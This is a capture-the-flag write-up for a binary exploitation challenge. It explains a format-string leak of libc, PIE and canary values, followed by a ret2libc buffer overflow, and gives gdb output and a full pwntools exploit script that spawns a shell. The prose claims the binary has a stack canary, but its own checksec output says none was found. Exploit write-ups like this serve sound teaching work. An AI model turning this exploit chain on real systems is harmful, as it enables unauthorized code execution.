# Shell Tester
# Description

Come and test our shell if you can. { server_addr }

### Author

momiji

### Points

150

# Write-up

This challenge includes two vulnerability: format string and buffer overflow. 
This binary is fully protected with stack canary and PIE.

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Now, hold yourself together, this is simpler than you might think. Since we have 
format string vulnerability we can leak pretty much everything from libc address, 
PIE offset and stack canary, so the idea is to leak everything we need and do 
a buffer overflow, what I decided to do here is leaking `rsi` register since 
the last call before `printf` is `fgets` and `rsi` is now hold the address for 
`_IO_2_1_stdin_ + 131` we can confirm this by using debugging tools like `gdb`.

```
[#0] Id 1, Name: "vuln", stopped 0x7ffff7eb36dd in __GI___libc_read (), reason: SIGINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7eb36dd → __GI___libc_read(fd=0x0, buf=0x7ffff7f97963 <_IO_2_1_stdin_+131>, nbytes=0x1)
[#1] 0x7ffff7e397a1 → _IO_new_file_underflow(fp=0x7ffff7f978e0 <_IO_2_1_stdin_>)
[#2] 0x7ffff7e3ba7b → __GI__IO_default_uflow(fp=0x7ffff7f978e0 <_IO_2_1_stdin_>)
[#3] 0x7ffff7e2ebba → __GI__IO_getline_info(fp=0x7ffff7f978e0 <_IO_2_1_stdin_>, buf=0x7fffffffded0 "\377\377\377\377\377\377\377\377", n=0x1336, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7ffff7e2ecb8 → __GI__IO_getline(fp=0x7ffff7f978e0 <_IO_2_1_stdin_>, buf=0x7fffffffded0 "\377\377\377\377\377\377\377\377", n=<optimized out>, delim=0xa, extract_delim=0x1)
[#5] 0x7ffff7e2da0a → _IO_fgets(buf=0x7fffffffded0 "\377\377\377\377\377\377\377\377", n=<optimized out>, fp=0x7ffff7f978e0 <_IO_2_1_stdin_>)
[#6] 0x555555555230 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/xg 0x7ffff7f97963
0x7ffff7f97963 <_IO_2_1_stdin_+131>:	0xf99720000000000a
```

Now what we have to do is finding an offset to PIE and canary and leak them.
With everything setup, all we have to do is a ret2libc attack and we are done.

Script:

```python
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
if args.REMOTE:
    io = remote("localhost", 13339)
    libc = ELF("./libc.so.6")
else:
    io = process()
    # gdb.attach(io)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

leak_payload = b"%p-%31$p-%47$p"
io.sendlineafter(b"?\n", leak_payload)

leak = io.recvline().split(b"-")
stdin = int(leak[0][2:], 16)
pie_main = int(leak[1][2:], 16)
canary = int(leak[2][2:-1], 16)

log.info(f"LEAK STDIN = {hex(stdin)}")
log.info(f"LEAK PIE_MAIN = {hex(pie_main)}")
log.info(f"LEAK CANARY = {hex(canary)}")

pie_base = pie_main - elf.symbols["main"]
libc_base = stdin - libc.symbols["_IO_2_1_stdin_"] - 131
log.info(f"BASE LIBC = {hex(libc_base)}")
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))
libc_rop = ROP(libc)
pop_rdi = libc_base + libc_rop.find_gadget(["pop rdi", "ret"])[0]
ret = pie_base + 0x1016

offset = 0xb0
payload = b"x" * (offset - 0x8) + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendlineafter(b"?\n", payload)
io.interactive()
```
